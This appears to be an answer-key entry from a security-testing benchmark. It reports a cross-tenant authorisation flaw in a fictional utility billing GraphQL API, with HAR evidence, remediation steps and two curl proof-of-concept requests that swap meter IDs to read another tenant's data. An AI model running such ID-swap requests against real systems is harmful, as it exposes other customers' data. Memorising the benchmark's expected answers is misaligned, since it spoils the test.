# Expected Response

## System
- Domain: Energy / Utilities / Smart Grid
- System: PowerGrid Customer Billing API
- Example ID: GQL-0064

## Priority Findings

### Finding 1: Smart Meter Cross-Tenant Enumeration via ID Swap — Single-User Scope Escape (Pattern 10.1)
**Severity:** Critical
**Category:** BOLA / Single-User Vulnerability

**Summary:**
Per §5.0 (Pattern 10.1 — ID swap in own request): "A single authenticated user substitutes their own valid `meterId` with a victim's `meterId`. With one token, data belonging to another user is accessible." Per §4.0 (RISK-GQL-064): `getMeter` resolver fetches by `meterId` only, without verifying the fetched object's `tenantId` against the JWT. An attacker from `tenant-8862` used `bulkMeterLookup` to retrieve smart meter billing records (`M-2064`, `M-1064`, `M-3064`) belonging to `tenant-4e51`. This exposes smart meter readings and billing data in a regulated utility environment.

**Evidence from HAR:**
- Request: `POST https://api.powergrid-customer-b.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-8862`
- Mutation: `bulkMeterLookup(ids: ["M-2064", "M-1064", "M-3064"]) { meterId tenantId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-4e51"`, `ownerId: "other-user-88624e51"`, `sensitiveField: "CONFIDENTIAL-88624e51"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-88624e51`

**Root Cause (§4.0 RISK-GQL-064):** `getMeter` / `bulkMeterLookup` resolve by ID only; no tenantId verification.

## Steps to Reproduce

### Step 1 — ID swap via bulkMeterLookup (HAR)
```bash
curl -s -X POST https://api.powergrid-customer-b.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-8862" \
  -d '{"query": "mutation { bulkMeterLookup(ids: [\"M-2064\", \"M-1064\", \"M-3064\"]) { meterId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-88624e51` from `tenant-4e51`. **Secure:** FORBIDDEN.

### Step 2 — Single ID swap (Pattern 10.1 — substituting own meterId with victim's)
```bash
curl -s -X POST https://api.powergrid-customer-b.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-8862" \
  -d '{"query": "query { getMeter(id: \"M-2064\") { meterId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Victim meter data returned. **Secure:** FORBIDDEN.

## Evidence Map
| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-064 | `getMeter` no tenantId check |
| context.txt §5.0 | Pattern 10.1 | ID swap in own request |
| HAR request | x-tenant-id | Attacker: `tenant-8862` |
| HAR response | tenantId | Victim: `tenant-4e51` |
| HAR response | sensitiveField | `CONFIDENTIAL-88624e51` |

## Remediation
1. Resolver tenant guard on `getMeter` and `bulkMeterLookup`: `WHERE meter_id=$id AND tenant_id=$jwt.tenantId`.
2. Redis cache key includes `tenantId`: `meter:{tenantId}:{meterId}`.
3. Reject any request where the looked-up `tenantId` differs from the JWT `tenantId`.
